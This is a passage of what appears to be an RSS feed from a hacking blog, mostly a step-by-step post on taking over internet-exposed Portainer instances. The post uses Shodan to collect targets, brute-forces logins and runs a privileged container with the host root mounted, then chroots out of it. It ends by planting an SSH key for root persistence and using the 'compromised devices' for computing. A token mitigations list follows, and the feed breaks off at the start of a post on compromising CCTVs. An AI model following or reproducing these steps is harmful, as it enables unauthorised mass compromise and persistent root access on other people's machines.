		data-flex-grow=&#34;253&#34;
		data-flex-basis=&#34;607px&#34;
	
&gt;&lt;br /&gt;
After Shodan has done compiling the data, it sends us a Mail that &lt;em&gt;Data is ready for Download&lt;/em&gt; or we can alernatively wait on &lt;a class=&#34;link&#34; href=&#34;https://www.shodan.io/download&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Shodan Download Page&lt;/a&gt; while the data is being compiled&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_mail.png&#34;
	width=&#34;1034&#34;
	height=&#34;530&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_mail_hu8959094722694699415.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_mail_hu11703782515361506775.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Shodan Download Mail&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;195&#34;
		data-flex-basis=&#34;468px&#34;
	
&gt;&lt;br /&gt;
The Download will be in the format &lt;em&gt;.json.gz&lt;/em&gt;. Shodan provides a Command-Line Utility to Parse the data in these download files.&lt;br /&gt;
The utility can be installed with the command&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pip install shodan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;The Targets from the downloaded file can be extracted with the following command&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shodan parse --fields ip_str,port --separator : &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;file_name&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;.json.gz
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;To save the Targets to a file, simply redirect the output of the command&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shodan parse --fields ip_str,port --separator : &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;file_name&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;.json.gz &amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;file_name_to_save_targets_to&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;I sometimes manually filterout some IPs by running a port scan, because sometimes the information provided by Shodan for some Devices is outdated.&lt;/p&gt;
&lt;h3 id=&#34;compiling-a-suitable-wordlist-for-brute-force&#34;&gt;Compiling a suitable Wordlist for Brute-Force
&lt;/h3&gt;&lt;p&gt;We can search for various Default/Weak Credentials Online. One of the best Repositories that I find for collecting Passwords for Brute-Force is &lt;a class=&#34;link&#34; href=&#34;https://github.com/danielmiessler/SecLists&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;SecLists&lt;/a&gt;.&lt;br /&gt;
Here, I won&amp;rsquo;t disclose more information about the wordlists that I use.&lt;/p&gt;
&lt;h2 id=&#34;brute-force&#34;&gt;Brute Force
&lt;/h2&gt;&lt;p&gt;To access the Portainer Dashboard, we first have to find correct credentials.&lt;br /&gt;
After collecting Target Devices and Passwords, we&amp;rsquo;re ready to do a Brute-Force attack on the Portainer Web Interface.&lt;br /&gt;
I use &lt;a class=&#34;link&#34; href=&#34;https://github.com/Gill-Singh-A/Portainer-Brute-Force&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Gill-Singh-A&lt;/a&gt;, it is a Program written in Python that uses requests to brute force the Web Interface of Portainer through &lt;em&gt;/api/auth&lt;/em&gt; endpoint and multithreading module to parallelize the brute force tasks.&lt;br &gt;
I&amp;rsquo;ve attached a small example of brute force in the following picture.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/brute_force.png&#34;
	width=&#34;1214&#34;
	height=&#34;788&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/brute_force_hu9138035496253350322.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/brute_force_hu14537001647000182556.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Brute Force&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;154&#34;
		data-flex-basis=&#34;369px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;getting-remote-root-shell&#34;&gt;Getting Remote Root Shell
&lt;/h2&gt;&lt;p&gt;Now after getting access to the Portainer Web Interface, our job is to get a Remote Root Shell.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/portainer_interface.png&#34;
	width=&#34;1920&#34;
	height=&#34;1080&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/portainer_interface_hu9614265903048951971.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/portainer_interface_hu8576249461380108094.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Portainer Interface&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;br /&gt;
First, we have to go to Images and find any Linux OS Image. Here in this example we see &lt;em&gt;ubuntu:latest&lt;/em&gt;&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/portainer_images.png&#34;
	width=&#34;1920&#34;
	height=&#34;1080&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/portainer_images_hu2322801518449959949.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/portainer_images_hu18078554214050661318.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Portainer Images&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;br /&gt;
Next, we go to containers and click on &lt;strong&gt;Add Container&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/add_container.png&#34;
	width=&#34;714&#34;
	height=&#34;154&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/add_container_hu3666424460501405624.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/add_container_hu15059500577359673673.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Add Container&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;463&#34;
		data-flex-basis=&#34;1112px&#34;
	
&gt;&lt;br /&gt;
We name the Container as &lt;em&gt;health_test&lt;/em&gt; :) and pull the Linux OS Image, in this case &lt;em&gt;ubuntu:latest&lt;/em&gt;&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_name_and_image.png&#34;
	width=&#34;1920&#34;
	height=&#34;1080&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_name_and_image_hu908856593392907783.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_name_and_image_hu12783991672513390335.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Container Name and Image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;br /&gt;
In the command and Logging Section, we select &lt;em&gt;Interactive and TTY&lt;/em&gt; Console.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/tty_shell.png&#34;
	width=&#34;1920&#34;
	height=&#34;1080&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/tty_shell_hu15233796208589774411.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/tty_shell_hu4016618940591782649.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Interactive and TTY Console&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;br /&gt;
Next we go to &lt;em&gt;Volume&lt;/em&gt;, Click on &lt;em&gt;Map Additional Volume&lt;/em&gt;, Click on &lt;em&gt;Bind&lt;/em&gt; and select &lt;em&gt;/host&lt;/em&gt; in container and &lt;em&gt;/&lt;/em&gt; in host. This way we&amp;rsquo;ve mounted the Host Root Directory into the Docker Container and we&amp;rsquo;ll use this to get the Remote Root Shell in the upcoming setups&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/volume_bind.png&#34;
	width=&#34;1920&#34;
	height=&#34;1080&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/volume_bind_hu14721800550594329791.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/volume_bind_hu12121615468244265343.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Volume Bind&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;br /&gt;
Next in &lt;em&gt;Runtime &amp;amp; Resources&lt;/em&gt; turn &lt;em&gt;Privilege Mode&lt;/em&gt; on.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/privilege_mode.png&#34;
	width=&#34;1920&#34;
	height=&#34;1080&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/privilege_mode_hu9582574800918379062.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/privilege_mode_hu17013298951981916531.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Privilege Mode&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;br /&gt;
Next in &lt;em&gt;Capabilities&lt;/em&gt;, turn every Linux Capability on to ensure smooth operation.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/linux_capabilities.png&#34;
	width=&#34;1920&#34;
	height=&#34;1080&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/linux_capabilities_hu15087138263603342898.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/linux_capabilities_hu6321382386868751134.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Linux Capabilities&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;br /&gt;
Then Click on &lt;em&gt;Deploy The Container&lt;/em&gt;.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_deploy.png&#34;
	width=&#34;1920&#34;
	height=&#34;1080&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_deploy_hu14319672496457784038.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_deploy_hu1116306713389433321.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Deploy The Container&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;br /&gt;
We can see our Container &lt;em&gt;health_test&lt;/em&gt; running.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_running.png&#34;
	width=&#34;1920&#34;
	height=&#34;1080&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_running_hu18313534528892442679.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_running_hu17285871667837831672.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Container Running&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;br /&gt;
Then we click on &lt;em&gt;exec console&lt;/em&gt; and in the &lt;em&gt;Container Console&lt;/em&gt; connect to &lt;em&gt;/bin/bash&lt;/em&gt; as &lt;em&gt;root&lt;/em&gt; user.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_root_user_connect.png&#34;
	width=&#34;1920&#34;
	height=&#34;1080&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_root_user_connect_hu3161454972954789171.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_root_user_connect_hu1411818477929618143.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Container Root User Bash&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;br /&gt;
Here, we&amp;rsquo;ve run the &lt;em&gt;bash&lt;/em&gt; as &lt;em&gt;root&lt;/em&gt; user in the Container&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_bash_shell.png&#34;
	width=&#34;1920&#34;
	height=&#34;1080&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_bash_shell_hu7415295291949231712.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_bash_shell_hu1747088773533602066.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Container Bash Shell&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;br /&gt;
We type the command &lt;em&gt;ps aux&lt;/em&gt; and see &lt;em&gt;bash&lt;/em&gt; Process with PID 1, this tells us that currently we&amp;rsquo;re inside the Container.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_bash_shell_pid.png&#34;
	width=&#34;1819&#34;
	height=&#34;245&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_bash_shell_pid_hu14170412485534328633.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_bash_shell_pid_hu7937223515794384908.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Container Bash Shell PID&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;742&#34;
		data-flex-basis=&#34;1781px&#34;
	
&gt;&lt;br /&gt;
Then to break out of the Container, we change our directory to &lt;em&gt;/host&lt;/em&gt; and &lt;em&gt;chroot&lt;/em&gt; into it and to confirm that We&amp;rsquo;ve successfully broken out of the container, we type &lt;em&gt;ps aux&lt;/em&gt; and see that &lt;em&gt;systemd&lt;/em&gt; has PID 1. Which confirms that we&amp;rsquo;ve broken out of the Container into the Host Machine&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_break.png&#34;
	width=&#34;1196&#34;
	height=&#34;282&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_break_hu15875942141868754971.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_break_hu16203558250265293144.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Container Break&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;424&#34;
		data-flex-basis=&#34;1017px&#34;
	
&gt;&lt;br /&gt;
The &lt;em&gt;chroot&lt;/em&gt; command usage is to change root directory to the supplied directory for the current running process and its children, so when we ran chroot in the &lt;em&gt;/host&lt;/em&gt; directory where the Host was mounted, then it changed the root directory to host and hence broke out of the docker container.&lt;br /&gt;
Next we check that we can login as root via ssh using the following command&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /etc/ssh/sshd_config &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep Root
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;If not then we set it to yes.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ssh_root_login.png&#34;
	width=&#34;470&#34;
	height=&#34;70&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ssh_root_login_hu12176505217845881688.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ssh_root_login_hu14977004533623781768.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;SSH Root Login&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;671&#34;
		data-flex-basis=&#34;1611px&#34;
	
&gt;&lt;br /&gt;
Next we generate a Public-Private Key Pair with the following command on our machine&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh-keygen -t rsa -b &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; -C root
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Then paste the Public Key File to the &lt;em&gt;/root/.ssh/authorized_keys&lt;/em&gt; of the Target Machine.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ssh_keys.png&#34;
	width=&#34;504&#34;
	height=&#34;128&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ssh_keys_hu14001699606681207158.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ssh_keys_hu14605633080691089983.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;SSH Keys&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;393&#34;
		data-flex-basis=&#34;945px&#34;
	
&gt;&lt;br /&gt;
After all this, now we&amp;rsquo;ll be able to ssh to the Target Machine with root user.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ssh_root.png&#34;
	width=&#34;688&#34;
	height=&#34;225&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ssh_root_hu7218786597690895416.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ssh_root_hu18022615190246826073.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;SSH Root&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;305&#34;
		data-flex-basis=&#34;733px&#34;
	
&gt;&lt;br /&gt;
We can further more Geolocate the IP Addresses using &lt;a class=&#34;link&#34; href=&#34;https://github.com/Gill-Singh-A/IP-Location&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Gill-Singh-A/IP-Location&lt;/a&gt; to get an approximate location of the Devices (although it may not always be correct)&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ip_geolocation.png&#34;
	width=&#34;1832&#34;
	height=&#34;900&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ip_geolocation_hu14051010684105683587.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ip_geolocation_hu9533190491809791552.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;IP Geolocation&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;203&#34;
		data-flex-basis=&#34;488px&#34;
	
&gt;&lt;br /&gt;
We can use the Compromised Devices for Cluster Computing after gaining basic information about their Processing Power, Memory, Space, etc&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/collection.png&#34;
	width=&#34;1618&#34;
	height=&#34;179&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/collection_hu16114222399472748084.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/collection_hu16740672284121985108.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;DB&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;903&#34;
		data-flex-basis=&#34;2169px&#34;
	
&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h2 id=&#34;mitigations&#34;&gt;Mitigations
&lt;/h2&gt;&lt;p&gt;In this blog we saw that how easy it was to gain remote root access to a Device that was using misconfigured Portainer Web Interface (exposed to internet, using weak credentials) in several ways.&lt;br /&gt;
To avoid getting your Device compromised, you should take the following steps:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Make sure that Portainer Interface is not exposed to the Internet&lt;/li&gt;
&lt;li&gt;Not using Default/Weak Credentials&lt;/li&gt;
&lt;li&gt;Setting up Proper Firewall Rules&lt;/li&gt;
&lt;li&gt;Keeping the Software/Firmware up to date, to avoid any CVEs present in the device that could be exploited&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;note&#34;&gt;Note
&lt;/h3&gt;&lt;p&gt;The Above mentioned points doesn&amp;rsquo;t Guarantee 100% protection, they only enhance the security&lt;/p&gt;
&lt;h2 id=&#34;checking-leaked-passwords&#34;&gt;Checking Leaked Passwords
&lt;/h2&gt;&lt;p&gt;There are several websites you can use to check whether the password that you&amp;rsquo;re using has been leaked somewhere online or not. Here are some popular ones:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://haveibeenpwned.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Have I Been Pwned&lt;/a&gt;: Check if your email or phone is in a data breach&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.dehashed.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Dehashed&lt;/a&gt;: Free deep-web scans and protection against credential leaks&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://leakcheck.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;LeakCheck.io&lt;/a&gt;: Make sure your credentials haven&amp;rsquo;t been compromised&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://crackstation.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;crackstation.net&lt;/a&gt;: Massive pre-computed lookup tables to crack password hashes&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://hashkiller.io/listmanager&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;HashKiller&lt;/a&gt;: Pre-cracked Hashes, easily searchable&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://leakedpassword.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;LeakedPassword&lt;/a&gt;: Search across multiple data breaches to see if your pass has been compromised&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://bugmenot.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;BugMeNot&lt;/a&gt;: Find and share logins&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- --&gt;
&lt;p&gt;Source: &lt;a class=&#34;link&#34; href=&#34;https://github.com/edoardottt/awesome-hacker-search-engines&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;edoardottt/awesome-hacker-search-engines&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Compromising CCTVs 101</title>
        <link>http://localhost:1313/p/compromising-cctvs-101/</link>
        <pubDate>Mon, 23 Sep 2024 05:13:06 +0530</pubDate>
        
        <guid>http://localhost:1313/p/compromising-cctvs-101/</guid>
        <description>&lt;img src="http://localhost:1313/p/compromising-cctvs-101/assets/images/main_image.png" alt="Featured image of post Compromising CCTVs 101" /&gt;&lt;h1 id=&#34;compromising-cctvs-101&#34;&gt;Compromising CCTVs 101
&lt;/h1&gt;&lt;h2 id=&#34;rtsp-protocol&#34;&gt;RTSP Protocol
&lt;/h2&gt;&lt;p&gt;RTSP Protocol stands for &lt;em&gt;Real Time Streaming Protocol&lt;/em&gt; and by default runs on &lt;em&gt;Port 554&lt;/em&gt;. As the name tells, its an application level protocol designed to transport streams over a network and is commonly used by Devices like CCTVs. The RTSP Protocol doesn&amp;rsquo;t offer encryption, therefore everything is transparent to an Attacker eavesdropping on the Network Traffic of a Device using RTSP. We won&amp;rsquo;t cover MITM (Man-in-the-Middle) Attacks and other eavesdropping methods in this blogs, rather will focus on gaining direct access to CCTVs.&lt;/p&gt;
&lt;h2 id=&#34;information-gathering&#34;&gt;Information Gathering
&lt;/h2&gt;&lt;h3 id=&#34;collecting-ip-addresses-of-cctvs&#34;&gt;Collecting IP Addresses of CCTVs
&lt;/h3&gt;&lt;p&gt;There are several ways of collecting IP Addresses of CCTVs, We&amp;rsquo;ll cover the most common ones:&lt;/p&gt;
&lt;ul&gt;
